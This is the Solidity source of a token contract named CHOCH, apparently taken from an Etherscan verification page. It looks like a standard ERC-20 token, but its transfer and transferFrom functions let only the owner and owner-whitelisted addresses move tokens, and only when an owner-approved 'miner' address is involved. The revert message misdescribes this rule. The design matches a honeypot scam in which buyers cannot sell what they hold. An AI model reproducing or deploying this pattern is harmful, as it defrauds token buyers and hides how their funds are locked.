/**
 *Submitted for verification at Etherscan.io on 2023-06-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CHOCH {
    string public name = "CHOCH";
    string public symbol = "CHO";
    uint256 public totalSupply = 100000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    mapping(address => bool) public allowedMiners;
    mapping(address => bool) public allowedSellers;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can perform this action");
        _;
    }

    modifier onlyAllowedMiner() {
        require(allowedMiners[msg.sender] || msg.sender == owner, "Only allowed miners can perform this action");
        _;
    }

    modifier onlyAllowedSeller() {
        require(allowedSellers[msg.sender] || msg.sender == owner, "Only allowed sellers can perform this action");
        _;
    }

    function allowMiner(address miner) external onlyOwner {
        allowedMiners[miner] = true;
    }

    function disallowMiner(address miner) external onlyOwner {
        allowedMiners[miner] = false;
    }

    function allowSeller(address seller) external onlyOwner {
        allowedSellers[seller] = true;
    }

    function disallowSeller(address seller) external onlyOwner {
        allowedSellers[seller] = false;
    }

    function transfer(address to, uint256 value) external onlyAllowedSeller returns (bool) {
        require(to != address(0), "Cannot transfer to the zero address");
        require(value > 0, "Transfer value must be greater than zero");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");

        if (allowedMiners[msg.sender] || allowedMiners[to]) {
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        } else {
            revert("Transfer to/from mining pool is not allowed");
        }

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        require(spender != address(0), "Cannot approve to the zero address");
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external onlyAllowedSeller returns (bool) {
        require(to != address(0), "Cannot transfer to the zero address");
        require(value > 0, "Transfer value must be greater than zero");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");

        if (allowedMiners[from] || allowedMiners[to]) {
            balanceOf[from] -= value;
            balanceOf[to] += value;
            allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true;
        } else {
            revert("Transfer to/from mining pool is not allowed");
        }
    }
}